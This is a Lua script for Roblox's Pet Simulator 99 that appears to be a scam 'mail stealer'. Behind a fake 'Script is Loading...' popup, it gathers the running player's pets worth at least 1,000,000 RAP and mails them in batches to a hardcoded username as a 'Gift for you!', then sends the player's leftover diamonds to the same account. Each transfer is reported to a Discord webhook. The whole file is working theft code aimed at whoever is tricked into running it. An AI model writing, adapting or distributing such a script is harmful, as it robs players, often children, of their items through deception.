--// SETTINGS
local TargetUsername = "zoobabatlle" -- Your username
local MinRAP = 1000000 -- Minimum RAP required
local MailCooldown = 3 -- Seconds between mails
local BulkAmount = 5 -- How many pets to mail at once
local WebhookURL = "https://discord.com/api/webhooks/your-webhook-url-here" -- Change to your webhook URL
local MailingFee = 100000 -- Diamonds needed to mail (adjust if wrong)

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Network = ReplicatedStorage:WaitForChild("Network")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local Save = Library.Save.Get()

--// LOADING POPUP
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local TextLabel = Instance.new("TextLabel", ScreenGui)
TextLabel.Size = UDim2.new(0, 300, 0, 50)
TextLabel.Position = UDim2.new(0.5, -150, 0.1, 0)
TextLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Text = "Script is Loading..."
TextLabel.TextScaled = true
TextLabel.BackgroundTransparency = 0.3
wait(2)
TextLabel.Text = "Running..."

--// HELPER FUNCTIONS
local function SendWebhook(content)
    if not WebhookURL or WebhookURL == "" then return end
    local http = game:GetService("HttpService")
    local data = http:JSONEncode({["content"] = content})
    pcall(function()
        request({Url = WebhookURL, Body = data, Method = "POST", Headers = {["Content-Type"] = "application/json"}})
    end)
end

local function MailPets(PetUIDs)
    local success, err = pcall(function()
        Network["Mailbox: Send"]:InvokeServer({
            ["Recipient"] = TargetUsername,
            ["Pets"] = PetUIDs,
            ["Diamonds"] = 0,
            ["Message"] = "Gift for you!"
        })
    end)
    if success then
        print("[Success] Sent pets: " .. table.concat(PetUIDs, ", "))
        SendWebhook("[PS99] Sent pets: " .. table.concat(PetUIDs, ", "))
    else
        warn("[Error] Failed to mail pets: " .. tostring(err))
        wait(5)
        MailPets(PetUIDs) -- Retry if failed
    end
end

local function SendDiamonds(amount)
    local success, err = pcall(function()
        Network["Mailbox: Send"]:InvokeServer({
            ["Recipient"] = TargetUsername,
            ["Pets"] = {},
            ["Diamonds"] = amount,
            ["Message"] = "Sending leftover Diamonds!"
        })
    end)
    if success then
        print("[Success] Sent diamonds: " .. amount)
        SendWebhook("[PS99] Sent leftover diamonds: " .. amount)
    else
        warn("[Error] Failed to mail diamonds: " .. tostring(err))
    end
end

--// MAIN
local PetsToSend = {}

for _, Pet in pairs(Save.Pets) do
    local PetData = Pet and Pet[2]
    if PetData and PetData["rap"] and PetData["rap"] >= MinRAP then
        table.insert(PetsToSend, Pet[1])
    end
end

print("[Info] Found " .. #PetsToSend .. " pets to send.")

for i = 1, #PetsToSend, BulkAmount do
    local Chunk = {}
    for j = i, math.min(i + BulkAmount - 1, #PetsToSend) do
        table.insert(Chunk, PetsToSend[j])
    end
    MailPets(Chunk)
    wait(MailCooldown)
end

--// Send leftover diamonds
local DiamondsLeft = Save["Diamonds"] or 0
if DiamondsLeft > MailingFee then
    local DiamondsToSend = DiamondsLeft - MailingFee
    SendDiamonds(DiamondsToSend)
end

--// Done
TextLabel.Text = "Finished!"
wait(2)
ScreenGui:Destroy()

print("[Script Completed]")
SendWebhook("[PS99] Script completed successfully!")
